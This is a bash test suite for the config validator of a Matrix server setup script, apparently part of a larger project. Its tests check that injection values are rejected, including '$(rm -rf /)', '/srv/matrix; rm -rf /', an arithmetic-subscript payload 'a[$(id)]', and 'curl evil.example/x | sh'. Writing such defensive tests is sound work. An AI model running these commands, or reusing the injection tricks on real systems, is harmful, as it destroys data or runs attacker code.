#!/usr/bin/env bash
# Tests for lib/04_config.sh — config validation
# shellcheck disable=SC2034
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/test_utils.sh"
source "$LIB_DIR/03_toml_parser.sh"
source "$LIB_DIR/04_config.sh"

# Helpers — properly track failures via _TEST_FAILURES
assert_config_valid() {
    local desc="$1"
    _TEST_NUM=$((_TEST_NUM + 1))
    if config_validate 2>/dev/null; then
        echo "ok $_TEST_NUM - $desc"
    else
        echo "not ok $_TEST_NUM - $desc"
        _TEST_FAILURES=$((_TEST_FAILURES + 1))
    fi
}

assert_config_invalid() {
    local desc="$1"
    _TEST_NUM=$((_TEST_NUM + 1))
    if config_validate 2>/dev/null; then
        echo "not ok $_TEST_NUM - $desc"
        _TEST_FAILURES=$((_TEST_FAILURES + 1))
    else
        echo "ok $_TEST_NUM - $desc"
    fi
}

# --- Test: valid minimal config passes ---
declare -gA CONFIG=()
HEADLESS="false"
CONFIG[domain.name]="example.com"
CONFIG[homeserver.type]="synapse"
_config_apply_defaults
assert_config_valid "valid minimal config passes"

# --- Test: missing domain fails ---
declare -gA CONFIG=()
HEADLESS="false"
CONFIG[domain.name]=""
_config_apply_defaults
assert_config_invalid "missing domain fails validation"

# --- Test: invalid domain format fails ---
declare -gA CONFIG=()
HEADLESS="false"
CONFIG[domain.name]="-bad-domain.com"
_config_apply_defaults
assert_config_invalid "invalid domain format fails"

# --- Test: headless requires domain.confirmed ---
declare -gA CONFIG=()
HEADLESS="true"
CONFIG[domain.name]="example.com"
CONFIG[domain.confirmed]="false"
CONFIG[admin.username]="admin"
CONFIG[admin.password]="longpassword"
_config_apply_defaults
assert_config_invalid "headless requires domain.confirmed"

# --- Test: dendrite + bridges = error ---
declare -gA CONFIG=()
HEADLESS="false"
CONFIG[domain.name]="example.com"
CONFIG[homeserver.type]="dendrite"
CONFIG[bridges.enabled]="telegram"
_config_apply_defaults
assert_config_invalid "dendrite+bridges rejected"

# --- Test: dendrite + admin_ui = error ---
declare -gA CONFIG=()
HEADLESS="false"
CONFIG[domain.name]="example.com"
CONFIG[homeserver.type]="dendrite"
CONFIG[admin_ui.enabled]="true"
_config_apply_defaults
assert_config_invalid "dendrite+admin_ui rejected"

# --- Test: open-email without SMTP fails ---
declare -gA CONFIG=()
HEADLESS="false"
CONFIG[domain.name]="example.com"
CONFIG[registration.policy]="open-email"
CONFIG[smtp.enabled]="false"
_config_apply_defaults
assert_config_invalid "open-email requires SMTP"

# --- Test: open-captcha without keys fails ---
declare -gA CONFIG=()
HEADLESS="false"
CONFIG[domain.name]="example.com"
CONFIG[registration.policy]="open-captcha"
_config_apply_defaults
assert_config_invalid "open-captcha requires recaptcha keys"

# --- Test: short admin password fails in headless ---
declare -gA CONFIG=()
HEADLESS="true"
CONFIG[domain.name]="example.com"
CONFIG[domain.confirmed]="true"
CONFIG[admin.username]="admin"
CONFIG[admin.password]="short"
_config_apply_defaults
assert_config_invalid "admin password min 8 chars enforced"

# --- Test: valid domain formats ---
HEADLESS="false"
for domain in "example.com" "matrix.example.org" "my-server.co.uk" "a.b"; do
    declare -gA CONFIG=()
    CONFIG[domain.name]="$domain"
    _config_apply_defaults
    assert_config_valid "valid domain: $domain"
done

# --- Test: invalid domain formats ---
for domain in "localhost" ".leading-dot.com" "trailing-.com" ""; do
    declare -gA CONFIG=()
    CONFIG[domain.name]="$domain"
    _config_apply_defaults
    assert_config_invalid "invalid domain rejected: '$domain'"
done

# --- Test: grafana_subdomain must be a plain DNS label ---
# The value reaches the compose and Caddyfile renderers raw.
HEADLESS="false"
for sub in 'graf|ana' 'graf;ana' 'graf ana' 'graf/ana' '-grafana' 'grafana-' 'graf$(id)'; do
    declare -gA CONFIG=()
    CONFIG[domain.name]="example.com"
    CONFIG[monitoring.grafana_subdomain]="$sub"
    _config_apply_defaults
    assert_config_invalid "invalid grafana_subdomain rejected: '$sub'"
done

# --- Test: ordinary grafana subdomains are accepted ---
for sub in "grafana" "stats" "matrix-stats" "g1"; do
    declare -gA CONFIG=()
    CONFIG[domain.name]="example.com"
    CONFIG[monitoring.grafana_subdomain]="$sub"
    _config_apply_defaults
    assert_config_valid "valid grafana_subdomain accepted: '$sub'"
done

# --- Test: a config carried over from an earlier version still validates ---
# dns.cloudflare_api_token was dropped: DNS-01 is not offered and the DNS-record
# writer it would have fed has no call sites, so the key reaches no renderer and
# is no longer validated. An operator's existing config must not fail for
# carrying it.
for tok in 'abc|def' 'tok$(id)' "dQw4w9WgXcQ-1234567890abcdefABCDEF_ghi"; do
    declare -gA CONFIG=()
    CONFIG[domain.name]="example.com"
    CONFIG[dns.cloudflare_api_token]="$tok"
    _config_apply_defaults
    assert_config_valid "a leftover cloudflare_api_token does not fail validation: '$tok'"
done

# --- Test: port values must be integers in range ---
# These reach `(( ))` in the firewall and coturn code, so a non-numeric value
# has to be rejected by the regex before any arithmetic evaluates it.
HEADLESS="false"
for key in coturn.min_port coturn.max_port smtp.port; do
    for bad in 'not-a-number' '80x' '$(id)' '0' '65536' '-1'; do
        declare -gA CONFIG=()
        CONFIG["domain.name"]="example.com"
        CONFIG["$key"]="$bad"
        _config_apply_defaults
        assert_config_invalid "invalid $key rejected: '$bad'"
    done
done

for port in 1 587 8448 65535; do
    declare -gA CONFIG=()
    CONFIG["domain.name"]="example.com"
    CONFIG["smtp.port"]="$port"
    _config_apply_defaults
    assert_config_valid "valid smtp.port accepted: $port"
done

# --- Test: the coturn relay range must be ordered ---
declare -gA CONFIG=()
CONFIG["domain.name"]="example.com"
CONFIG["coturn.min_port"]="50000"
CONFIG["coturn.max_port"]="49000"
_config_apply_defaults
assert_config_invalid "coturn.min_port above coturn.max_port rejected"

declare -gA CONFIG=()
CONFIG["domain.name"]="example.com"
CONFIG["coturn.min_port"]="50000"
CONFIG["coturn.max_port"]="50000"
_config_apply_defaults
assert_config_invalid "coturn relay range of zero ports rejected"

declare -gA CONFIG=()
CONFIG["domain.name"]="example.com"
CONFIG["coturn.min_port"]="49152"
CONFIG["coturn.max_port"]="65535"
_config_apply_defaults
assert_config_valid "ordered coturn relay range accepted"

# --- Test: media_retention.days must be a non-negative integer ---
# It is interpolated into the generated cleanup script's arithmetic.
for bad in 'thirty' '30d' '$(rm -rf /)' '-7'; do
    declare -gA CONFIG=()
    CONFIG["domain.name"]="example.com"
    CONFIG["media_retention.days"]="$bad"
    _config_apply_defaults
    assert_config_invalid "invalid media_retention.days rejected: '$bad'"
done

for good in 0 7 365; do
    declare -gA CONFIG=()
    CONFIG["domain.name"]="example.com"
    CONFIG["media_retention.days"]="$good"
    _config_apply_defaults
    assert_config_valid "valid media_retention.days accepted: $good"
done

# --- Test: hardening switches must be true or false ---
# A value like "yes" used to mean "not true", which silently disabled the
# control the operator thought they had asked for.
HEADLESS="false"
for key in hardening.ssh hardening.firewall hardening.fail2ban hardening.sysctl \
           hardening.auto_updates hardening.ssh_tcp_forwarding hardening.ipv6_privacy; do
    for bad in 'yes' 'no' '1' '0' 'maybe' 'True' '$(id)'; do
        declare -gA CONFIG=()
        CONFIG["domain.name"]="example.com"
        _config_apply_defaults
        CONFIG["$key"]="$bad"
        assert_config_invalid "invalid $key rejected: '$bad'"
    done
    for good in 'true' 'false'; do
        declare -gA CONFIG=()
        CONFIG["domain.name"]="example.com"
        _config_apply_defaults
        CONFIG["$key"]="$good"
        assert_config_valid "valid $key accepted: '$good'"
    done
done

# --- Test: hardening.conntrack_max must be a sensible positive integer ---
for bad in 'lots' '131072x' '$(id)' '0' '-1' '99999999'; do
    declare -gA CONFIG=()
    CONFIG["domain.name"]="example.com"
    _config_apply_defaults
    CONFIG["hardening.conntrack_max"]="$bad"
    assert_config_invalid "invalid hardening.conntrack_max rejected: '$bad'"
done

for good in 1024 131072 1048576; do
    declare -gA CONFIG=()
    CONFIG["domain.name"]="example.com"
    _config_apply_defaults
    CONFIG["hardening.conntrack_max"]="$good"
    assert_config_valid "valid hardening.conntrack_max accepted: $good"
done

# --- Test: backup retention values are pinned to integers ---
# They reach an arithmetic context in the root-run backup timer, where an array
# subscript operand executes: a[$(cmd)] runs cmd on bash 5.2.21.
for bad in 'a[$(id)]' '7; id' '$(id)' '-1' '7.5'; do
    declare -gA CONFIG=()
    CONFIG["domain.name"]="example.com"
    _config_apply_defaults
    CONFIG["backup.retention_daily"]="$bad"
    assert_config_invalid "invalid backup.retention_daily rejected: '$bad'"
done

for bad in 'a[$(id)]' 'weekly'; do
    declare -gA CONFIG=()
    CONFIG["domain.name"]="example.com"
    _config_apply_defaults
    CONFIG["backup.retention_weekly"]="$bad"
    assert_config_invalid "invalid backup.retention_weekly rejected: '$bad'"
done

# An empty value never reaches the script: the defaults fill it in.
declare -gA CONFIG=()
CONFIG["domain.name"]="example.com"
CONFIG["backup.retention_daily"]=""
_config_apply_defaults
assert_eq "$DEFAULT_BACKUP_DAILY" "${CONFIG[backup.retention_daily]}" \
    "an empty backup.retention_daily falls back to the default"

for good in 0 1 7 52; do
    declare -gA CONFIG=()
    CONFIG["domain.name"]="example.com"
    _config_apply_defaults
    CONFIG["backup.retention_daily"]="$good"
    CONFIG["backup.retention_weekly"]="$good"
    assert_config_valid "valid backup retention accepted: $good"
done

# --- Test: the new keys default to today's behaviour ---
declare -gA CONFIG=()
CONFIG["domain.name"]="example.com"
_config_apply_defaults
assert_eq "true" "${CONFIG[hardening.ssh_tcp_forwarding]:-<unset>}" \
    "hardening.ssh_tcp_forwarding defaults to true"
assert_eq "false" "${CONFIG[hardening.ipv6_privacy]:-<unset>}" \
    "hardening.ipv6_privacy defaults to false"
assert_eq "" "${CONFIG[hardening.conntrack_max]:-}" \
    "hardening.conntrack_max defaults to unset"
assert_config_valid "defaults alone pass validation"

# --- Test: every new key is documented where the operator will read it ---
EXAMPLE_TOML="$PROJECT_DIR/config/matrix-setup.example.toml"
for key in ssh_tcp_forwarding ipv6_privacy conntrack_max; do
    assert_true "$key is documented in matrix-setup.example.toml" \
        grep -q "$key" "$EXAMPLE_TOML"
done

# --- Test: [advanced] keys reach the code that reads them ---
# The example config nests install_dir/matrix_user under [advanced], so the
# parser yields `advanced.install_dir`, while every consumer reads `install_dir`.
ADV_TMP="$(mktemp -d)"
trap 'rm -rf "$ADV_TMP"' EXIT

cat > "$ADV_TMP/advanced.toml" <<'EOF'
[domain]
name = "example.com"

[advanced]
install_dir = "/srv/matrix"
matrix_user = "mtx"
podman_compose_command = "docker-compose"
EOF

declare -gA CONFIG=()
declare -gA TOML_VALUES=()
config_load "$ADV_TMP/advanced.toml" >/dev/null 2>&1
assert_eq "/srv/matrix" "${CONFIG[install_dir]:-<unset>}" \
    "advanced.install_dir populates install_dir"
assert_eq "mtx" "${CONFIG[matrix_user]:-<unset>}" \
    "advanced.matrix_user populates matrix_user"

# A top-level key keeps working, and wins over the [advanced] form.
cat > "$ADV_TMP/toplevel.toml" <<'EOF'
install_dir = "/srv/top"

[domain]
name = "example.com"

[advanced]
install_dir = "/srv/advanced"
EOF
declare -gA CONFIG=()
declare -gA TOML_VALUES=()
config_load "$ADV_TMP/toplevel.toml" >/dev/null 2>&1
assert_eq "/srv/top" "${CONFIG[install_dir]:-<unset>}" \
    "a top-level install_dir wins over the [advanced] form"

# With neither form present the default still applies.
cat > "$ADV_TMP/bare.toml" <<'EOF'
[domain]
name = "example.com"
EOF
declare -gA CONFIG=()
declare -gA TOML_VALUES=()
config_load "$ADV_TMP/bare.toml" >/dev/null 2>&1
assert_eq "$DEFAULT_INSTALL_DIR" "${CONFIG[install_dir]:-<unset>}" \
    "install_dir falls back to the default when unconfigured"

# The install_dir validation at lib/04_config.sh now sees the [advanced] value.
cat > "$ADV_TMP/unsafe.toml" <<'EOF'
[domain]
name = "example.com"
confirmed = true

[advanced]
install_dir = "/srv/matrix; rm -rf /"
EOF
declare -gA CONFIG=()
declare -gA TOML_VALUES=()
HEADLESS="false"
config_load "$ADV_TMP/unsafe.toml" >/dev/null 2>&1
assert_config_invalid "an unsafe advanced.install_dir is rejected by validation"

# --- Test: advanced.podman_compose_command is honoured ---
ADV_BIN="$ADV_TMP/bin"
mkdir -p "$ADV_BIN"
printf '#!/bin/sh\nexit 0\n' > "$ADV_BIN/docker-compose"
chmod +x "$ADV_BIN/docker-compose"

declare -gA CONFIG=()
_config_apply_defaults
COMPOSE_CMD="podman compose"
COMPOSE_NETWORKING="dns"
CONFIG["advanced.podman_compose_command"]="docker-compose"
PATH="$ADV_BIN:$PATH" config_apply_compose_command >/dev/null 2>&1
assert_eq "docker-compose" "$COMPOSE_CMD" \
    "advanced.podman_compose_command overrides the detected compose tool"
assert_eq "dns" "$COMPOSE_NETWORKING" \
    "docker-compose selects dns networking"

declare -gA CONFIG=()
_config_apply_defaults
COMPOSE_CMD="podman compose"
COMPOSE_NETWORKING="dns"
CONFIG["advanced.podman_compose_command"]="podman-compose"
printf '#!/bin/sh\nexit 0\n' > "$ADV_BIN/podman-compose"
chmod +x "$ADV_BIN/podman-compose"
PATH="$ADV_BIN:$PATH" config_apply_compose_command >/dev/null 2>&1
assert_eq "podman-compose" "$COMPOSE_CMD" \
    "podman-compose is selected when requested"
assert_eq "pod" "$COMPOSE_NETWORKING" \
    "podman-compose selects pod networking"

# "auto" leaves detection alone.
declare -gA CONFIG=()
_config_apply_defaults
COMPOSE_CMD="podman compose"
COMPOSE_NETWORKING="dns"
config_apply_compose_command >/dev/null 2>&1
assert_eq "podman compose" "$COMPOSE_CMD" \
    "the default 'auto' leaves the detected compose tool in place"

# A requested tool that is not installed must not silently replace a working one.
declare -gA CONFIG=()
_config_apply_defaults
COMPOSE_CMD="podman compose"
COMPOSE_NETWORKING="dns"
CONFIG["advanced.podman_compose_command"]="docker-compose"
adv_out=""
adv_out="$(PATH="/nonexistent-$$:/usr/bin:/bin" config_apply_compose_command 2>&1)" || true
assert_eq "podman compose" "$COMPOSE_CMD" \
    "an unavailable requested compose tool leaves the detected one in place"
assert_match "docker-compose" "$adv_out" \
    "the fallback names the compose tool that was requested"

# Only the documented values are accepted.
declare -gA CONFIG=()
CONFIG["domain.name"]="example.com"
_config_apply_defaults
CONFIG["advanced.podman_compose_command"]="curl evil.example/x | sh"
assert_config_invalid "an undocumented podman_compose_command is rejected"

declare -gA CONFIG=()
CONFIG["domain.name"]="example.com"
_config_apply_defaults
CONFIG["advanced.podman_compose_command"]="podman compose"
assert_config_valid "a documented podman_compose_command is accepted"


# --- Test: the state file persists no credential-shaped value ---
# The filter skipped `*.password` and `*.secret*` only, so bridge tokens, the
# Cloudflare API token and the reCAPTCHA private key were all written to it.
STATE_DIR="$(mktemp -d)"
declare -gA CONFIG=()
CONFIG["domain.name"]="example.com"
CONFIG["homeserver.type"]="synapse"
CONFIG["install_dir"]="$STATE_DIR"
CONFIG["admin.password"]="admin-password-value"
CONFIG["secrets.postgres_password"]="pg-password-value"
CONFIG["secrets.registration_shared_secret"]="reg-secret-value"
CONFIG["secrets.coturn_secret"]="coturn-secret-value"
CONFIG["secrets.whatsapp_as_token"]="as-token-value"
CONFIG["secrets.whatsapp_hs_token"]="hs-token-value"
CONFIG["dns.cloudflare_api_token"]="cloudflare-token-value"
CONFIG["registration.recaptcha_private_key"]="recaptcha-private-value"
CONFIG["backup.encryption_key"]="encryption-key-value"
config_save_state >/dev/null 2>&1

STATE_FILE="$STATE_DIR/$MATRIX_SETUP_STATE_FILE"
assert_file_exists "$STATE_FILE" "the state file is written"
for secret in admin-password-value pg-password-value reg-secret-value \
              coturn-secret-value as-token-value hs-token-value \
              cloudflare-token-value recaptcha-private-value encryption-key-value; do
    assert_false "the state file does not persist $secret" \
        grep -q "$secret" "$STATE_FILE"
done

# What the state file exists for must still be there: upgrade_check reads these.
assert_file_contains "$STATE_FILE" "domain.name=example.com" \
    "the state file still records the domain"
assert_file_contains "$STATE_FILE" "homeserver.type=synapse" \
    "the state file still records the homeserver type"
assert_file_contains "$STATE_FILE" "version=" "the state file still records the version"
assert_eq "600" "$(stat -c '%a' "$STATE_FILE")" "the state file stays 0600"
rm -rf "$STATE_DIR"

test_report
